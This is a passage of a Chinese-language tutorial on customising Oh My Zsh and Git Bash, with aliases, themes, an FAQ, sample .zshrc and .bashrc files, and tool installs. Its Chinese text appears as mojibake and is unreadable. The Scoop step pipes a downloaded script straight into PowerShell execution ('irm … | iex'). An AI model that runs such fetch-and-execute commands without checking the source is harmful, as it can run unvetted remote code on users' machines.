<h3 data-id="heading-43">1.3 ä½¿ç”¨æŠ€å·§</h3>
<h4 data-id="heading-44">1.3.1 è‡ªåŠ¨è¡¥å…¨æŠ€å·§</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># zsh-autosuggestions</span>
<span class="hljs-built_in">cd</span> ~/Doc[æŒ‰ â†’]  <span class="hljs-comment"># è‡ªåŠ¨è¡¥å…¨ä¸º cd ~/Documents</span>

<span class="hljs-comment"># å¦‚æœå»ºè®®ä¸æ˜¯ä½ æƒ³è¦çš„ï¼Œç»§ç»­è¾“å…¥</span>
<span class="hljs-built_in">cd</span> ~/Down[æŒ‰ â†’]  <span class="hljs-comment"># è¡¥å…¨ä¸º cd ~/Downloads</span>
</code></pre>
<h4 data-id="heading-45">1.3.2 ç›®å½•è·³è½¬æŠ€å·§</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å…ˆè®¿é—®å‡ æ¬¡ç›®å½•å»ºç«‹ç´¢å¼•</span>
<span class="hljs-built_in">cd</span> ~/Documents/Projects/MyApp
<span class="hljs-built_in">cd</span> ~/Downloads
<span class="hljs-built_in">cd</span> ~/Desktop

<span class="hljs-comment"># ä¹‹åå¯ä»¥å¿«é€Ÿè·³è½¬ï¼ˆæ— éœ€è¾“å…¥å®Œæ•´è·¯å¾„ï¼‰</span>
j myapp    <span class="hljs-comment"># è·³è½¬åˆ° ~/Documents/Projects/MyApp</span>
z down     <span class="hljs-comment"># è·³è½¬åˆ° ~/Downloads</span>
j desk     <span class="hljs-comment"># è·³è½¬åˆ° ~/Desktop</span>
</code></pre>
<h4 data-id="heading-46">1.3.3 æ¨¡ç³Šæœç´¢æŠ€å·§</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Ctrl+Rï¼šæ¨¡ç³Šæœç´¢å†å²å‘½ä»¤</span>
<span class="hljs-comment"># è¾“å…¥å…³é”®è¯ï¼Œå®æ—¶è¿‡æ»¤å‘½ä»¤å†å²</span>
<span class="hljs-comment"># ä¸Šä¸‹é”®é€‰æ‹©ï¼ŒEnter æ‰§è¡Œ</span>

<span class="hljs-comment"># Ctrl+Tï¼šæ¨¡ç³Šæœç´¢å½“å‰ç›®å½•æ–‡ä»¶</span>
<span class="hljs-comment"># è¾“å…¥æ–‡ä»¶åå…³é”®è¯ï¼Œå¿«é€Ÿå®šä½æ–‡ä»¶</span>

<span class="hljs-comment"># Alt+Cï¼šæ¨¡ç³Šæœç´¢å¹¶åˆ‡æ¢ç›®å½•</span>
<span class="hljs-comment"># è¾“å…¥ç›®å½•åå…³é”®è¯ï¼Œå¿«é€Ÿåˆ‡æ¢</span>
</code></pre>
<h4 data-id="heading-47">1.3.4 Git åˆ«åé€ŸæŸ¥</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¸¸ç”¨æ“ä½œ</span>
gst        <span class="hljs-comment"># git status</span>
gaa        <span class="hljs-comment"># git add --all</span>
gcmsg      <span class="hljs-comment"># git commit -m "message"</span>
gp         <span class="hljs-comment"># git push</span>
gl         <span class="hljs-comment"># git pull</span>

<span class="hljs-comment"># åˆ†æ”¯æ“ä½œ</span>
gco        <span class="hljs-comment"># git checkout</span>
gcb        <span class="hljs-comment"># git checkout -b</span>
gbr        <span class="hljs-comment"># git branch</span>

<span class="hljs-comment"># æŸ¥çœ‹å†å²</span>
glog       <span class="hljs-comment"># git log --oneline --graph</span>
gdiff      <span class="hljs-comment"># git diff</span>

<span class="hljs-comment"># æš‚å­˜æ“ä½œ</span>
gstash     <span class="hljs-comment"># git stash</span>
gstashp    <span class="hljs-comment"># git stash pop</span>
</code></pre>
<hr/>
<h3 data-id="heading-48">1.4 ä¸»é¢˜é…ç½®</h3>
<h4 data-id="heading-49">1.4.1 çƒ­é—¨ä¸»é¢˜æ¨è</h4>
<p>ç¼–è¾‘ <code>~/.zshrc</code> ä¸­çš„ <code>ZSH_THEME</code> é…ç½®ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. Powerlevel10kï¼ˆåŠŸèƒ½æœ€å¼ºï¼Œé«˜åº¦å¯å®šåˆ¶ï¼‰â­â­â­â­â­</span>
ZSH_THEME=<span class="hljs-string">"powerlevel10k/powerlevel10k"</span>

<span class="hljs-comment"># 2. robbyrussellï¼ˆé»˜è®¤ä¸»é¢˜ï¼Œç®€æ´æ¸…çˆ½ï¼‰â­â­â­â­</span>
ZSH_THEME=<span class="hljs-string">"robbyrussell"</span>

<span class="hljs-comment"># 3. agnosterï¼ˆç¾è§‚ï¼Œéœ€è¦ Powerline å­—ä½“ï¼‰â­â­â­â­</span>
ZSH_THEME=<span class="hljs-string">"agnoster"</span>

<span class="hljs-comment"># 4. pureï¼ˆæç®€é£æ ¼ï¼‰â­â­â­</span>
ZSH_THEME=<span class="hljs-string">"pure"</span>
</code></pre>
<h4 data-id="heading-50">1.4.2 å®‰è£… Powerlevel10k</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å…‹éš†ä¸»é¢˜åˆ° Oh My Zsh ä¸»é¢˜ç›®å½•</span>
git <span class="hljs-built_in">clone</span> --depth=1 https://github.com/romkatv/powerlevel10k.git <span class="hljs-variable">${ZSH_CUSTOM:-<span class="hljs-variable">$HOME</span>/.oh-my-zsh/custom}</span>/themes/powerlevel10k

<span class="hljs-comment"># åœ¨ ~/.zshrc ä¸­è®¾ç½®ä¸»é¢˜</span>
ZSH_THEME=<span class="hljs-string">"powerlevel10k/powerlevel10k"</span>

<span class="hljs-comment"># é‡è½½é…ç½®ï¼Œä¼šè‡ªåŠ¨å¯åŠ¨é…ç½®å‘å¯¼</span>
<span class="hljs-built_in">source</span> ~/.zshrc
</code></pre>
<hr/>
<h3 data-id="heading-51">1.5 å¸¸è§é—®é¢˜</h3>
<h4 data-id="heading-52">Q1: æ’ä»¶å®‰è£…åä¸ç”Ÿæ•ˆï¼Ÿ</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># è§£å†³æ–¹æ¡ˆï¼š</span>
<span class="hljs-comment"># 1. æ£€æŸ¥ ~/.zshrc ä¸­ plugins æ•°ç»„æ˜¯å¦åŒ…å«æ’ä»¶å</span>
<span class="hljs-comment"># 2. æ£€æŸ¥æ’ä»¶æ˜¯å¦æ­£ç¡®å®‰è£…åˆ°ç›®å½•</span>
<span class="hljs-built_in">ls</span> ~/.oh-my-zsh/custom/plugins/

<span class="hljs-comment"># 3. é‡è½½é…ç½®</span>
<span class="hljs-built_in">source</span> ~/.zshrc
</code></pre>
<h4 data-id="heading-53">Q2: å‘½ä»¤æç¤ºç¬¦å‡ºç°ä¹±ç ï¼Ÿ</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åŸå› ï¼šç¼ºå°‘ Powerline å­—ä½“</span>
<span class="hljs-comment"># è§£å†³æ–¹æ¡ˆï¼š</span>

<span class="hljs-comment"># macOS</span>
brew tap homebrew/cask-fonts
brew install --cask font-hack-nerd-font

<span class="hljs-comment"># Ubuntu/Debian</span>
sudo apt install fonts-powerline

<span class="hljs-comment"># å®‰è£…åï¼Œåœ¨ç»ˆç«¯è®¾ç½®ä¸­é€‰æ‹©å®‰è£…çš„å­—ä½“</span>
</code></pre>
<h4 data-id="heading-54">Q3: å¦‚ä½•å¸è½½æ’ä»¶ï¼Ÿ</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. ä» ~/.zshrc çš„ plugins æ•°ç»„ä¸­ç§»é™¤æ’ä»¶å</span>
<span class="hljs-comment"># 2. åˆ é™¤æ’ä»¶ç›®å½•ï¼ˆå¦‚æœæ˜¯æ‰‹åŠ¨å…‹éš†çš„ï¼‰</span>
<span class="hljs-built_in">rm</span> -rf ~/.oh-my-zsh/custom/plugins/æ’ä»¶å

<span class="hljs-comment"># 3. é‡è½½é…ç½®</span>
<span class="hljs-built_in">source</span> ~/.zshrc
</code></pre>
<h4 data-id="heading-55">Q4: å¦‚ä½•æ›´æ–° Oh My Zsh å’Œæ’ä»¶ï¼Ÿ</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ›´æ–° Oh My Zsh</span>
omz update

<span class="hljs-comment"># æ›´æ–°æ‰€æœ‰æ’ä»¶</span>
<span class="hljs-built_in">cd</span> ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions &amp;&amp; git pull
<span class="hljs-built_in">cd</span> ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting &amp;&amp; git pull
</code></pre>
<hr/>
<h3 data-id="heading-56">1.6 å®Œæ•´é…ç½®ç¤ºä¾‹</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ~/.zshrc å®Œæ•´é…ç½®ç¤ºä¾‹</span>

<span class="hljs-comment"># Oh My Zsh è·¯å¾„</span>
<span class="hljs-built_in">export</span> ZSH=<span class="hljs-string">"<span class="hljs-variable">$HOME</span>/.oh-my-zsh"</span>

<span class="hljs-comment"># ä¸»é¢˜</span>
ZSH_THEME=<span class="hljs-string">"robbyrussell"</span>

<span class="hljs-comment"># æ’ä»¶</span>
plugins=(
  git
  zsh-autosuggestions
  zsh-syntax-highlighting
  autojump
  z
  fzf
  colored-man-pages
  extract
  docker
  kubectl
  npm
  yarn
)

<span class="hljs-comment"># åŠ è½½ Oh My Zsh</span>
<span class="hljs-built_in">source</span> <span class="hljs-variable">$ZSH</span>/oh-my-zsh.sh

<span class="hljs-comment"># ===== è‡ªå®šä¹‰é…ç½® =====</span>

<span class="hljs-comment"># ç¯å¢ƒå˜é‡</span>
<span class="hljs-built_in">export</span> LANG=zh_CN.UTF-8
<span class="hljs-built_in">export</span> EDITOR=vim

<span class="hljs-comment"># å¸¸ç”¨åˆ«å</span>
<span class="hljs-built_in">alias</span> ll=<span class="hljs-string">"ls -lah"</span>
<span class="hljs-built_in">alias</span> la=<span class="hljs-string">"ls -A"</span>
<span class="hljs-built_in">alias</span> cls=<span class="hljs-string">"clear"</span>
<span class="hljs-built_in">alias</span> vi=<span class="hljs-string">"vim"</span>

<span class="hljs-comment"># ç›®å½•å¿«æ·é”®</span>
<span class="hljs-built_in">alias</span> ..=<span class="hljs-string">"cd .."</span>
<span class="hljs-built_in">alias</span> ...=<span class="hljs-string">"cd ../.."</span>
<span class="hljs-built_in">alias</span> ....=<span class="hljs-string">"cd ../../.."</span>

<span class="hljs-comment"># Git å¢å¼ºåˆ«å</span>
<span class="hljs-built_in">alias</span> gundo=<span class="hljs-string">"git reset --soft HEAD^"</span>
<span class="hljs-built_in">alias</span> gclean=<span class="hljs-string">"git clean -fd"</span>

<span class="hljs-comment"># è‡ªå®šä¹‰å‡½æ•°</span>
<span class="hljs-function"><span class="hljs-title">mkcd</span></span>() {
    <span class="hljs-built_in">mkdir</span> -p <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span> &amp;&amp; <span class="hljs-built_in">cd</span> <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>
}

<span class="hljs-comment"># å¯åŠ¨æ¶ˆæ¯</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"âœ“ Zsh é…ç½®åŠ è½½å®Œæˆ"</span>
</code></pre>
<hr/>
<hr/>
<h2 data-id="heading-57">äºŒã€Git Bash å¢å¼ºæŒ‡å— (Windows)</h2>
<blockquote>
<p><strong>é€‚ç”¨ç³»ç»Ÿ</strong>ï¼šWindows<br/>
<strong>è¯´æ˜</strong>ï¼šGit Bash åŸç”Ÿä½¿ç”¨ Bashï¼Œæ’ä»¶ç”Ÿæ€ä¸å¦‚ Zsh ä¸°å¯Œï¼Œä½†é€šè¿‡åˆç†é…ç½®ä¹Ÿèƒ½è·å¾—è‰¯å¥½ä½“éªŒã€‚</p>
</blockquote>
<h3 data-id="heading-58">2.0 æ ¸å¿ƒæ¦‚å¿µè¯´æ˜</h3>
<h4 data-id="heading-59">ä»€ä¹ˆæ˜¯ Git Bashï¼Ÿ</h4>
<p><strong>Git Bash</strong> æ˜¯ Git for Windows é™„å¸¦çš„ä¸€ä¸ªç»ˆç«¯æ¨¡æ‹Ÿå™¨ï¼Œæä¾›äº†ç±»ä¼¼ Linux çš„å‘½ä»¤è¡Œç¯å¢ƒã€‚</p>
<pre><code class="hljs language-bash" lang="bash">ç®€å•ç†è§£ï¼š
Git Bash = Windows ä¸Šçš„<span class="hljs-string">"ç®€åŒ–ç‰ˆ Linux ç»ˆç«¯"</span>
å¯ä»¥åœ¨ Windows ä¸Šä½¿ç”¨ Linux å‘½ä»¤ï¼ˆ<span class="hljs-built_in">ls</span>ã€<span class="hljs-built_in">cd</span>ã€grep ç­‰ï¼‰
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆè¦ç”¨ Git Bashï¼Ÿ</strong></p>
<ul>
<li>âœ… åœ¨ Windows ä¸Šä½¿ç”¨ Linux å‘½ä»¤</li>
<li>âœ… æ›´å¥½çš„ Git æ“ä½œä½“éªŒ</li>
<li>âœ… æ¯” CMD å’Œ PowerShell æ›´é€‚åˆå¼€å‘è€…</li>
<li>âœ… è½»é‡ï¼Œä¸éœ€è¦å®‰è£…è™šæ‹Ÿæœº</li>
</ul>
<h4 data-id="heading-60">Git Bash ä¸ Zsh çš„åŒºåˆ«</h4>



































<table><thead><tr><th>å¯¹æ¯”é¡¹</th><th>Git Bash</th><th>Zsh (WSL)</th></tr></thead><tbody><tr><td><strong>Shell ç±»å‹</strong></td><td>Bash</td><td>Zsh</td></tr><tr><td><strong>æ’ä»¶ç”Ÿæ€</strong></td><td>è¾ƒå°‘</td><td>ä¸°å¯Œ</td></tr><tr><td><strong>é…ç½®æ–‡ä»¶</strong></td><td><code>~/.bashrc</code></td><td><code>~/.zshrc</code></td></tr><tr><td><strong>å®‰è£…éš¾åº¦</strong></td><td>ç®€å•</td><td>ä¸­ç­‰</td></tr><tr><td><strong>ç³»ç»Ÿè¦æ±‚</strong></td><td>ä»»æ„ Windows</td><td>Win10+</td></tr></tbody></table>
<h4 data-id="heading-61">Git Bash å¢å¼ºæ€è·¯</h4>
<p>ç”±äº Git Bash æ²¡æœ‰åƒ Oh My Zsh è¿™æ ·çš„æ’ä»¶æ¡†æ¶ï¼Œæˆ‘ä»¬éœ€è¦ï¼š</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">æ–¹æ¡ˆ1: ç›´æ¥å®‰è£…ç‹¬ç«‹å·¥å…·</span>
  â””â”€ fzfã€batã€z ç­‰ç‹¬ç«‹ç¨‹åº
  â””â”€ é€šè¿‡ .bashrc é…ç½®åŠ è½½

<span class="hljs-section">æ–¹æ¡ˆ2: é…ç½®åˆ«åå’Œå‡½æ•°</span>
  â””â”€ åœ¨ .bashrc ä¸­è‡ªå®šä¹‰ Git åˆ«å
  â””â”€ ç¼–å†™å®ç”¨å‡½æ•°

<span class="hljs-section">æ–¹æ¡ˆ3: ä½¿ç”¨ Scoop åŒ…ç®¡ç†å™¨</span>
  â””â”€ ç±»ä¼¼ macOS çš„ Homebrew
  â””â”€ ä¸€é”®å®‰è£…æ‰€æœ‰å·¥å…·
</code></pre>
<h4 data-id="heading-62">æ£€æŸ¥ä½ çš„æƒ…å†µ</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. æ£€æŸ¥æ˜¯å¦å·²å®‰è£… Git Bash</span>
<span class="hljs-comment"># å¼€å§‹èœå•æœç´¢ "Git Bash"ï¼Œèƒ½æ‰¾åˆ°è¯´æ˜å·²å®‰è£…</span>

<span class="hljs-comment"># 2. æ‰“å¼€ Git Bashï¼Œæ£€æŸ¥ç‰ˆæœ¬</span>
git --version
bash --version

<span class="hljs-comment"># 3. æ£€æŸ¥æ˜¯å¦æœ‰é…ç½®æ–‡ä»¶</span>
<span class="hljs-built_in">ls</span> -la ~/.bashrc
<span class="hljs-comment"># å¦‚æœæ˜¾ç¤ºæ–‡ä»¶ä¸å­˜åœ¨ï¼Œè¯´æ˜æ˜¯å…¨æ–°çš„</span>
</code></pre>
<p><strong>æ ¹æ®ä½ çš„æƒ…å†µï¼š</strong></p>





















<table><thead><tr><th>æƒ…å†µ</th><th>è·³è½¬åˆ°</th></tr></thead><tbody><tr><td>âŒ æ²¡æœ‰ Git Bash</td><td><a href="#211-%E5%AE%89%E8%A3%85-git-bash" title="#211-%E5%AE%89%E8%A3%85-git-bash">å®‰è£… Git Bash</a></td></tr><tr><td>âœ… æœ‰ Git Bash</td><td><a href="#212-%E5%AE%89%E8%A3%85%E5%A2%9E%E5%BC%BA%E5%B7%A5%E5%85%B7" title="#212-%E5%AE%89%E8%A3%85%E5%A2%9E%E5%BC%BA%E5%B7%A5%E5%85%B7">ç›´æ¥å®‰è£…æ’ä»¶</a></td></tr><tr><td>âœ… æƒ³ä¸€é”®é…ç½®</td><td><a href="#22-%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC" title="#22-%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC">ä½¿ç”¨å®‰è£…è„šæœ¬</a></td></tr></tbody></table>
<hr/>
<h3 data-id="heading-63">2.1 å®‰è£…ä¸é…ç½®</h3>
<h4 data-id="heading-64">2.1.1 å®‰è£… Git Bash</h4>
<blockquote>
<p><strong>é€‚ç”¨å¯¹è±¡</strong>ï¼šå…¨æ–° Windows ç³»ç»Ÿï¼Œæœªå®‰è£… Git</p>
</blockquote>
<p><strong>ç¬¬ä¸€æ­¥ï¼šä¸‹è½½ Git for Windows</strong></p>
<pre><code class="hljs language-ruby" lang="ruby">ä¸‹è½½åœ°å€ï¼š<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/git-scm.com/download</span><span class="hljs-regexp">/win
æˆ–å›½å†…é•œåƒï¼šhttps:/</span><span class="hljs-regexp">/npm.taobao.org/mirrors</span><span class="hljs-regexp">/git-for-windows/</span>
</code></pre>
<p><strong>ç¬¬äºŒæ­¥ï¼šå®‰è£…</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> åŒå‡»å®‰è£…åŒ…
<span class="hljs-bullet">2.</span> æ‰€æœ‰é€‰é¡¹ä¿æŒé»˜è®¤å³å¯ï¼ˆä¸€è·¯ Nextï¼‰
<span class="hljs-bullet">3.</span> é‡è¦é€‰é¡¹è¯´æ˜ï¼š
<span class="hljs-bullet">   -</span> Editor: é»˜è®¤ Vimï¼ˆå»ºè®®æ”¹æˆ VS Code å¦‚æœä½ æœ‰è£…ï¼‰
<span class="hljs-bullet">   -</span> Path environment: é€‰æ‹© "Git from the command line and also from 3rd-party software"
<span class="hljs-bullet">   -</span> SSH executable: ä½¿ç”¨é»˜è®¤çš„ OpenSSH
<span class="hljs-bullet">   -</span> Line ending: å»ºè®®é€‰æ‹© "Checkout Windows-style, commit Unix-style"
</code></pre>
<p><strong>ç¬¬ä¸‰æ­¥ï¼šéªŒè¯å®‰è£…</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ‰“å¼€ Git Bashï¼ˆå³é”®æ¡Œé¢æˆ–æ–‡ä»¶å¤¹ â†’ Git Bash Hereï¼‰</span>

<span class="hljs-comment"># éªŒè¯å®‰è£…</span>
git --version
<span class="hljs-comment"># åº”è¯¥æ˜¾ç¤ºï¼šgit version 2.x.x</span>

bash --version
<span class="hljs-comment"># åº”è¯¥æ˜¾ç¤ºï¼šGNU bash, version 4.x.x æˆ– 5.x.x</span>
</code></pre>
<hr/>
<h4 data-id="heading-65">2.1.2 å®‰è£…å¢å¼ºå·¥å…·</h4>
<blockquote>
<p><strong>é€‚ç”¨å¯¹è±¡</strong>ï¼šå·²ç»æœ‰ Git Bashï¼Œæƒ³æ·»åŠ å¢å¼ºåŠŸèƒ½</p>
</blockquote>
<p>Git Bash çš„å¢å¼ºä¸»è¦é€šè¿‡å®‰è£…ç‹¬ç«‹å·¥å…·å®ç°ï¼Œåˆ†ä¸‰ç§å®‰è£…æ–¹å¼ï¼š</p>
<h5 data-id="heading-66">æ–¹å¼ä¸€ï¼šScoop åŒ…ç®¡ç†å™¨ï¼ˆæ¨èï¼‰â­â­â­â­â­</h5>
<p><strong>ä»€ä¹ˆæ˜¯ Scoopï¼Ÿ</strong></p>
<ul>
<li>Windows çš„å‘½ä»¤è¡ŒåŒ…ç®¡ç†å™¨ï¼ˆç±»ä¼¼ macOS çš„ Homebrewï¼‰</li>
<li>å¯ä»¥ä¸€é”®å®‰è£…å„ç§å¼€å‘å·¥å…·</li>
<li>ä¸éœ€è¦ç®¡ç†å‘˜æƒé™</li>
<li>è‡ªåŠ¨é…ç½®ç¯å¢ƒå˜é‡</li>
</ul>
<p><strong>å®‰è£… Scoopï¼š</strong></p>
<pre><code class="hljs language-powershell" lang="powershell"># åœ¨ PowerShell ä¸­æ‰§è¡Œï¼ˆä¸æ˜¯ Git Bashï¼‰
# å³é”®å¼€å§‹èœå• â†’ Windows PowerShell

# è®¾ç½®æ‰§è¡Œç­–ç•¥
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser

# å®‰è£… Scoop
irm get.scoop.sh | iex

# éªŒè¯å®‰è£…
scoop --version
</code></pre>
<p><strong>ä½¿ç”¨ Scoop å®‰è£…å·¥å…·ï¼š</strong></p>
<pre><code class="hljs language-powershell" lang="powershell"># åœ¨ PowerShell ä¸­æ‰§è¡Œï¼ˆä¸€é”®å®‰è£…æ‰€æœ‰æ¨èå·¥å…·ï¼‰
scoop install git
scoop install fzf
scoop install bat
scoop install ripgrep
scoop install fd
scoop install starship

# ğŸ’¡ è¿™äº›å·¥å…·å®‰è£…ååœ¨ Git Bash ä¸­ä¹Ÿèƒ½ç”¨
</code></pre>
<hr/>
<h5 data-id="heading-67">æ–¹å¼äºŒï¼šæ‰‹åŠ¨ä¸‹è½½å®‰è£…</h5>
<p><strong>å¦‚æœä¸æƒ³ç”¨ Scoopï¼Œå¯ä»¥æ‰‹åŠ¨ä¸‹è½½ï¼š</strong></p>
<p><strong>1. fzfï¼ˆæ¨¡ç³Šæœç´¢ï¼‰â­â­â­â­â­</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åœ¨ Git Bash ä¸­æ‰§è¡Œ</span>
git <span class="hljs-built_in">clone</span> --depth 1 https://github.com/junegunn/fzf.git ~/.fzf
~/.fzf/install

<span class="hljs-comment"># é€‰æ‹©ï¼š</span>
<span class="hljs-comment"># - Enable fuzzy auto-completion? (y/n) â†’ y</span>
<span class="hljs-comment"># - Enable key bindings? (y/n) â†’ y</span>
<span class="hljs-comment"># - Update shell configuration files? (y/n) â†’ y</span>
</code></pre>
<p><strong>2. zï¼ˆç›®å½•è·³è½¬ï¼‰â­â­â­â­</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä¸‹è½½ z.sh</span>
curl -fsSL https://raw.githubusercontent.com/rupa/z/master/z.sh -o ~/z.sh

<span class="hljs-comment"># å¦‚æœ curl å¤±è´¥ï¼Œä½¿ç”¨ Git Bash å†…ç½®çš„æ–¹å¼</span>
<span class="hljs-comment"># æ‰‹åŠ¨ä¸‹è½½ï¼šhttps://raw.githubusercontent.com/rupa/z/master/z.sh</span>
<span class="hljs-comment"># ä¿å­˜åˆ° C:\Users\ä½ çš„ç”¨æˆ·å\z.sh</span>
</code></pre>
<p><strong>3. bash-git-promptï¼ˆç¾åŒ–æç¤ºç¬¦ï¼‰â­â­â­â­</strong></p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://github.com/magicmonty/bash-git-prompt.git ~/.bash-git-prompt --depth=1
</code></pre>
<p><strong>4. batï¼ˆå¢å¼ºç‰ˆ catï¼‰â­â­â­â­</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä¸‹è½½åœ°å€ï¼šhttps://github.com/sharkdp/bat/releases</span>
<span class="hljs-comment"># æ‰¾åˆ° bat-*-x86_64-pc-windows-msvc.zip</span>
<span class="hljs-comment"># ä¸‹è½½å¹¶è§£å‹ï¼Œå°† bat.exe å¤åˆ¶åˆ°ï¼š</span>
<span class="hljs-comment"># C:\Program Files\Git\usr\bin\</span>
</code></pre>
<p><strong>5. ripgrepï¼ˆå¿«é€Ÿæœç´¢ï¼‰â­â­â­â­</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä¸‹è½½åœ°å€ï¼šhttps://github.com/BurntSushi/ripgrep/releases</span>
<span class="hljs-comment"># æ‰¾åˆ° ripgrep-*-x86_64-pc-windows-msvc.zip</span>
<span class="hljs-comment"># ä¸‹è½½å¹¶è§£å‹ï¼Œå°† rg.exe å¤åˆ¶åˆ°ï¼š</span>
<span class="hljs-comment"># C:\Program Files\Git\usr\bin\</span>
</code></pre>
<hr/>
<h5 data-id="heading-68">æ–¹å¼ä¸‰ï¼šé…ç½® .bashrc</h5>
<p><strong>è¿™ä¸€æ­¥åœ¨åšä»€ä¹ˆï¼Ÿ</strong> è®© Git Bash åœ¨å¯åŠ¨æ—¶è‡ªåŠ¨åŠ è½½å·¥å…·å’Œé…ç½®ã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç¼–è¾‘é…ç½®æ–‡ä»¶</span>
vim ~/.bashrc
<span class="hljs-comment"># æˆ–</span>
nano ~/.bashrc
<span class="hljs-comment"># æˆ–ä½¿ç”¨ VS Code</span>
code ~/.bashrc
</code></pre>
<p><strong>æ·»åŠ ä»¥ä¸‹é…ç½®ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ===== Git Bash å¢å¼ºé…ç½® =====</span>

<span class="hljs-comment"># åŠ è½½ zï¼ˆç›®å½•è·³è½¬ï¼‰</span>
<span class="hljs-keyword">if</span> [ -f ~/z.sh ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">source</span> ~/z.sh
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># åŠ è½½ fzfï¼ˆæ¨¡ç³Šæœç´¢ï¼‰</span>
<span class="hljs-keyword">if</span> [ -f ~/.fzf.bash ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">source</span> ~/.fzf.bash
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># åŠ è½½ bash-git-promptï¼ˆç¾åŒ–ï¼‰</span>
<span class="hljs-keyword">if</span> [ -f ~/.bash-git-prompt/gitprompt.sh ]; <span class="hljs-keyword">then</span>
    GIT_PROMPT_ONLY_IN_REPO=1
    <span class="hljs-built_in">source</span> ~/.bash-git-prompt/gitprompt.sh
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># Git åˆ«åï¼ˆå¿…å¤‡ï¼‰â­â­â­â­â­</span>
<span class="hljs-built_in">alias</span> gst=<span class="hljs-string">'git status'</span>
<span class="hljs-built_in">alias</span> gco=<span class="hljs-string">'git checkout'</span>
<span class="hljs-built_in">alias</span> gcb=<span class="hljs-string">'git checkout -b'</span>
<span class="hljs-built_in">alias</span> gaa=<span class="hljs-string">'git add --all'</span>
<span class="hljs-built_in">alias</span> gcm=<span class="hljs-string">'git commit -m'</span>
<span class="hljs-built_in">alias</span> gp=<span class="hljs-string">'git push'</span>
<span class="hljs-built_in">alias</span> gl=<span class="hljs-string">'git pull'</span>
<span class="hljs-built_in">alias</span> gbr=<span class="hljs-string">'git branch'</span>
<span class="hljs-built_in">alias</span> glog=<span class="hljs-string">'git log --oneline --graph --decorate'</span>

<span class="hljs-comment"># å¸¸ç”¨åˆ«å</span>
<span class="hljs-built_in">alias</span> ll=<span class="hljs-string">'ls -lah'</span>
<span class="hljs-built_in">alias</span> la=<span class="hljs-string">'ls -A'</span>
<span class="hljs-built_in">alias</span> cls=<span class="hljs-string">'clear'</span>
<span class="hljs-built_in">alias</span> ..=<span class="hljs-string">'cd ..'</span>
<span class="hljs-built_in">alias</span> ...=<span class="hljs-string">'cd ../..'</span>

<span class="hljs-comment"># å¦‚æœå®‰è£…äº† bat</span>
<span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span> -v bat &amp;&gt; /dev/null; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">alias</span> <span class="hljs-built_in">cat</span>=<span class="hljs-string">'bat'</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># å¦‚æœå®‰è£…äº† fd</span>
<span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span> -v fd &amp;&gt; /dev/null; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">alias</span> find=<span class="hljs-string">'fd'</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># å†å²è®°å½•ä¼˜åŒ–</span>
<span class="hljs-built_in">export</span> HISTSIZE=10000
<span class="hljs-built_in">export</span> HISTFILESIZE=20000
<span class="hljs-built_in">export</span> HISTCONTROL=ignoreboth:erasedups

<span class="hljs-comment"># å½©è‰²è¾“å‡º</span>
<span class="hljs-built_in">export</span> CLICOLOR=1
<span class="hljs-built_in">alias</span> <span class="hljs-built_in">ls</span>=<span class="hljs-string">'ls --color=auto'</span>
<span class="hljs-built_in">alias</span> grep=<span class="hljs-string">'grep --color=auto'</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"âœ“ Git Bash å¢å¼ºé…ç½®åŠ è½½å®Œæˆ"</span>
</code></pre>
<p><strong>ä¿å­˜å¹¶ç”Ÿæ•ˆï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># é‡æ–°åŠ è½½é…ç½®</span>
<span class="hljs-built_in">source</span> ~/.bashrc

<span class="hljs-comment"># æˆ–é‡å¯ Git Bash</span>
</code></pre>
<hr/>
<h3 data-id="heading-69">2.1.3 æ¨èå·¥å…·è¯¦è§£</h3>
